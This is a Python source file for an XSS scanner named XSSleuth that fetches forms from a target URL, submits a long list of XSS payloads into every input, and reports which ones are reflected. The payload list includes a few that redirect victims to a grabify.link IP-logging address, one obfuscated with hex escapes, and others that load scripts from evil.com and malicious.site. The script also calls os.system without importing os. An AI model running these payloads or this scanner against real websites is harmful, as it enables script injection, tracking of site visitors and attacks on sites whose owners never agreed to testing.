import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from colorama import Fore, Style, init
import pyfiglet
os.system("clear")
init(autoreset=True)

#payloads lists
#you can add payloads
#میتونید پیلودی که دوست دارید رو به لیست اضافه کنید تا روی سایت تست بشه
XSS_PAYLOADS = [
    "toString=(()=>{window['location']='https://grabify.link/J8W2UV'})()",
    "toString=\u0061lert;window+''",
    "toString=(()=>{window['\x6cocation']='\x68ttps://grabify.link/J8W2UV'})()",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<body onload=alert(1)>",
    "<video><source onerror=alert(1)></video>",
    "<input onfocus=alert(1) autofocus>",
    "<svg><script>alert(1)</script></svg>",
    "<a href='javascript:alert(1)'>click</a>",
    "<math><maction xlink:href=\"javascript:alert(1)\">CLICK</maction></math>",
    "<div style=\"animation-name: x\" onanimationstart=\"alert(1)\"></div>",
    "<object data='javascript:alert(1)'></object>",
    "<embed src='javascript:alert(1)'></embed>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    "<link rel='stylesheet' href='javascript:alert(1)'>",
    "<form action='javascript:alert(1)'><input type=submit></form>",
    "<img src=1 href=1 onerror=alert(1)>",
    "<script src='data:text/javascript,alert(1)'></script>",
    "<base href='javascript://' /><script>alert(1)</script>",
    "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<table background='javascript:alert(1)'>",
    "<frame src='javascript:alert(1)'>",
    "<img src=xx:x onerror=alert(1)>",
    "<img src='data:image/svg+xml;base64,...'>",  # custom crafted
    "<script>/*<!--*/alert(1)//--></script>",
    "<script><!--alert(1)//--></script>",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    "<script>Function('alert(1)')()</script>",
    "<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>",
    "<isindex onmouseover=alert(1)>",
    "<img onerror=confirm(1) src=x>",
    "<img onerror=prompt(1) src=x>",
    "<svg><a xlink:href='javascript:alert(1)'>click</a></svg>",
    "<img src='x:confirm(1)' onerror='eval(src)'>",
    "<div onpointerover=alert(1)>Move</div>",
    "<script>top </script>",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    "<button formaction='javascript:alert(1)'>Click</button>",
    "<svg><style>@keyframes x{}</style><div style='animation-name:x' onanimationstart='alert(1)'></div></svg>",
    "<textarea autofocus onfocus=alert(1)>",
    "<script>window </script>",
    "<img src=1 onerror=eval('al'+'ert(1)')>",
    "<script>this.onerror=alert;throw '1'</script>",
    "<meta charset='x' onerror='alert(1)'>",
    "<object type='text/html' data='javascript:alert(1)'></object>",
    "<script src=//evil.com/xss.js></script>",  # external
    "<svg onload=alert(String.fromCharCode(49))>",
    "<img src=x:confirm(1) onerror=eval(this.src)>",
    "<img src='data:image/png;base64,...' onload=alert(1)>",  # fake base64
    "<audio src onerror=alert(1)>",
    "<svg><g onload=alert(1)></g></svg>",
    "<img src=\"x\" onerror=\"alert`1`\">",
    "<form><button formaction=\"javascript:alert(1)\">X</button></form>",
    "<div onmouseover=\"alert(1)\">hover</div>",
    "<script src=\"//0\">",
    "<svg><style>div{}</style><div style='animation-name:div' onanimationstart=alert(1)></div></svg>",
    "<script id=payload>alert(1)</script>",
    "<img src onerror='setTimeout(()=>{alert(1)},100)'>",
    "<iframe onload=alert(1)>",
    "<b onmouseover=alert(1)>move</b>",
    "<img src onerror='location=`javascript:alert(1)`'>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>new Function`alert(1)`()</script>",
    "<svg><set onbegin='alert(1)' /></svg>",
    "<svg><animate attributeName='onload' to='alert(1)'/></svg>",
    "<math><mtext><script>alert(1)</script></mtext></math>",
    "<script>confirm('x')</script>",
    "<script>prompt('x')</script>",
    "<img onerror=alert(document.domain) src=x>",
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "<object data=javascript:alert(1)>",
    "<input type=image src=1 onerror=alert(1)>",
    "<iframe srcdoc='<svg onload=alert(1)>'></iframe>",
    "<script type='text/javascript'>alert(1)</script>",
    "<script x>alert(1)</script>",
    "<svg><script xmlns='http://www.w3.org/1999/xhtml'>alert(1)</script></svg>",
    "<script>/* comment */ alert(1) //</script>",
    "<img src=javascript:alert(1)>",
    "<svg/onload=\"alert(1)\">",
    "<script src=\"javascript:alert(1)\"></script>",
    "<script>window </script>",
    "<object onerror=alert(1) data=''></object>",
    "<script>new Function('alert(1)')()</script>",
    "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>",
    "<img src=1 onerror=\"setTimeout('alert(1)',100)\">",
    "<div onmouseleave=alert(1)>leave</div>",
    "<script>alert(/xss/.source)</script>",
    "<form><input name=x value=\"<script>alert(1)</script>\"></form>",
    "<video><track onerror=alert(1)></video>",
    "<div onclick=alert(1)>Click</div>",
    "<img src=x:alert(1) onerror=eval(this.src)>",
    "<script src=//malicious.site/x.js></script>",
    "<input onmouseover=alert(1) value=hover>",
    "<img onload=alert(1) src=x>",
    "<svg><a xlink:href='data:text/html,<script>alert(1)</script>'>click</a></svg>",
    "<meta http-equiv='Set-Cookie' content='test=1; path=/;'><script>alert(document.cookie)</script>",
    "<img src=x:eval(alert(1)) onerror=eval(this.src)>",
    "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
    "<img src=x onerror=`alert\x281\x29`>",
    "<script>eval('al' + 'ert(1)')</script>",
    "<script>setTimeout`alert\x281\x29`</script>",
    "<scr\0ipt>alert(1)</scr\0ipt>",
    "<scr<script>ipt>alert(1)</script>",
    "<s\0cript>alert(1)</s\0cript>",
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
    "<math><mtext></mtext><script>alert(1)</script></math>",
    "<svg/onload=&#97;lert(1)>",
    "<svg/onload=%61lert(1)>",
    "<div onpointerover&#x3D;alert(1)>move</div>",
    "<svg><animate onbegin=alert(1) attributeName=x></animate></svg>",
    "<svg><set onbegin=alert(1) attributeName=x></set></svg>",
    "<a href='jav\rascript:alert(1)'>click</a>",
    "<a href='jav&#x09;ascript:alert(1)'>click</a>",
    "<a href='jav&#x0A;ascript:alert(1)'>click</a>",
    "<iframe srcdoc='<svg/onload=alert(1)>'></iframe>",
    "<img src='x:' onerror='eval(\"al\" + \"ert(1)\")'>",
    "<img src='x:' onerror=window >",
    "<img src onerror='setTimeout`` '>",
    "<input onblur=top  autofocus>",
    "<body onpageshow='top '>",
    "<form><button formaction='jav&#x61;script:alert(1)'>click</button></form>",
    "<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==></object>",
    "<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==></iframe>",
    "<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>click</a>",
    "<input type='text' value='\" onfocus=alert(1) autofocus>",
    "<textarea oninput=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) autofocus>x",
    "<img src onerror='Function(`alert(1)`)()'>",
    "<img src=x:confirm(1) onerror=eval(this.src)>",
    "<script>this.onerror=alert;throw 1</script>",
    "<video><source onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'></video>",
    "<svg><g onload='`alert(1)`'></g></svg>",
    "<svg><script xlink:href='data:text/javascript,alert(1)'></script></svg>",
    "<iframe src=\"data:text/html,<script>alert(1)</script>\">",
    "<img src=x onerror=eval('al\\u0065rt(1)')>",
    "<script>window </script>",
    "<img src=x onerror=top >",
    "<svg><script>/*%0a*/alert(1)//</script></svg>",
    "<img src='x' onerror='(()=>{alert(1)})()'>",
    "<a href='java\u0000script:alert(1)'>click</a>",
    "<math><maction xlink:href=\"jav&#x61;script:alert(1)\">CLICK</maction></math>",
    "<img src=x onerror=parent >",
    "<svg><use href='#x' onload='alert(1)'></use></svg>",
    "<iframe srcdoc='&#60;script&#62;alert(1)&#60;/script&#62;'></iframe>",
    "<svg><desc><![CDATA[</desc><script x>alert(1)</script>]]></svg>",
    "<script id='x'>eval('alert(1)')</script>",
    "<iframe src='data:text/html;base64," + "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>"
]

init()
ascii_banner = pyfiglet.figlet_format("XSSleuth")


print(Fore.RED + ascii_banner)

github_url = "https://github.com/MrBananaError"
print(Fore.CYAN + "GitHub: " + github_url + Style.RESET_ALL)



vulnerabilities = []

def get_forms(url):
    try:
        res = requests.get(url, timeout=10)
        soup = BeautifulSoup(res.text, "html.parser")
        return soup.find_all("form")
    except Exception as e:
        print(Fore.RED + f"[!] Error fetching forms: {e}")
        return []

def get_form_details(form):
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []

    for tag in form.find_all("input"):
        input_type = tag.attrs.get("type", "text")
        input_name = tag.attrs.get("name")
        if input_name:
            inputs.append({"type": input_type, "name": input_name})

    return {"action": action, "method": method, "inputs": inputs}

def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"] or "")
    data = {}

    for input in form_details["inputs"]:
        data[input["name"]] = payload

    try:
        if form_details["method"] == "post":
            res = requests.post(target_url, data=data, timeout=10)
        else:
            res = requests.get(target_url, params=data, timeout=10)
        return res
    except Exception as e:
        print(Fore.RED + f"[!] Error submitting form: {e}")
        return None

def scan_xss(url):
    print(Fore.BLUE + f"\n[*] Starting XSS scan on: {url}\n")
    forms = get_forms(url)
    if not forms:
        print(Fore.RED + "[!] No forms found.")
        return

    for idx, payload in enumerate(XSS_PAYLOADS):
        print(Fore.YELLOW + f"\n--- Testing Payload {idx+1}/{len(XSS_PAYLOADS)} ---")
        print(Fore.WHITE + f"Payload: {payload}")
        payload_found = False

        for i, form in enumerate(forms):
            form_details = get_form_details(form)
            res = submit_form(form_details, url, payload)
            if res and payload in res.text:
                payload_found = True
                vuln_data = {
                    "form_number": i + 1,
                    "action": form_details["action"],
                    "method": form_details["method"].upper(),
                    "url": urljoin(url, form_details["action"] or ""),
                    "payload": payload
                }
                vulnerabilities.append(vuln_data)

                print(Fore.GREEN + f"  [!!] XSS Detected!")
                print(Fore.GREEN + f"       → Form #{i+1}")
                print(Fore.GREEN + f"       → Action: {form_details['action']}")
                print(Fore.GREEN + f"       → Method: {form_details['method'].upper()}")
                print(Fore.GREEN + f"       → URL: {urljoin(url, form_details['action'] or '')}")
            else:
                print(Fore.BLUE + f"  [info] Form #{i+1} seems clean.")

        if not payload_found:
            print(Fore.RED + f"[-] No XSS found for this payload.")

    print(Fore.BLUE + "\n[*] Scan complete.\n")

    if vulnerabilities:
        print(Fore.YELLOW + "====== VULNERABILITY REPORT ======")
        for i, vuln in enumerate(vulnerabilities, 1):
            print(Fore.GREEN + f"\n[{i}] XSS Vulnerability Found!")
            print(Fore.GREEN + f"    → URL:    {vuln['url']}")
            print(Fore.GREEN + f"    → Method: {vuln['method']}")
            print(Fore.GREEN + f"    → Action: {vuln['action']}")
            print(Fore.GREEN + f"    → Form #: {vuln['form_number']}")
            print(Fore.GREEN + f"    → Payload: {vuln['payload']}")
        print(Fore.GREEN + f"\n[!] Total xss found: {len(vulnerabilities)}")
    else:
        print(Fore.RED + "[+] No vulnerabilities found.")

if __name__ == "__main__":
    target = input("Enter target URL (e.g. https://example.com):  ").strip()
    if not target.startswith("http"):
        print(Fore.RED + "[!] Invalid URL. Include http:// or https://")
    else:
        scan_xss(target)
